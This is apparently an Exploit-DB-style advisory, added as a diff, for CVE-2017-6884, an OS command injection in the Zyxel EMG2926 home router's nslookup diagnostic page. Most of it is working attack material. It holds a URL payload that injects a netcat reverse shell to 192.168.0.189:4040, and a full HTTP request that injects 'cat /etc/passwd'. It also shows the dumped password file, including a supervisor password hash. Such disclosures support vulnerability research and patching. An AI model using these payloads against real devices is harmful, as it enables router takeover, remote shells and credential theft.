@@ -1,0 +1,37 @@
+# Exploit Title: Zyxel, EMG2926 < V1.00(AAQT.4)b8 - OS Command Injection
+# Date: 2017-04-02
+# Exploit Author: Fluffy Huffy (trevor Hough)
+# Vendor Homepage: www.zyxel.com
+# Version: EMG2926 - V1.00(AAQT.4)b8
+# Tested on: linux
+# CVE : CVE-2017-6884
+
+OS command injection vulnerability was discovered in a commonly used
+home router (zyxel - EMG2926 - V1.00(AAQT.4)b8). The vulnerability is located in the diagnostic tools
+specify the nslookup function. A malicious user may exploit numerous
+vectors to execute arbitrary commands on the router.
+
+Exploit (Reverse Shell)
+https://192.168.0.1/cgi-bin/luci/;stok=redacted/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&
+ping_ip=google.ca%20%3B%20nc%20192.168.0.189%204040%20-e%20/p
+
+Exploit (Dump Password File)
+Request
+GET /cgi-bin/luci/;stok=<Clipped>/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&ping_ip=google.ca%3b%20cat%20/etc/passwd&server_ip= HTTP/1.1
+Host: 192.168.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://192.168.0.1/cgi-bin/luci/;stok=<Clipped>/expert/maintenance/diagnostic/nslookup
+Accept-Language: en-US,en;q=0.8
+Cookie: csd=9; sysauth=<Clipped>
+Connection: close
+
+Response (Clipped)
+<textarea cols="80" rows="15" readonly="true">root:x:0:0:root:/root:/bin/ash
+daemon:*:1:1:daemon:/var:/bin/false
+ftp:*:55:55:ftp:/home/ftp:/bin/false
+network:*:101:101:network:/var:/bin/false
+nobody:*:65534:65534:nobody:/var:/bin/false
+supervisor:$1$RM8l7snU$KW2C58L2Ijt0th1ThR70q0:0:0:supervisor:/:/bin/ash
+admin:$1$<Clipped>:0:0:admin:/:/bin/fail
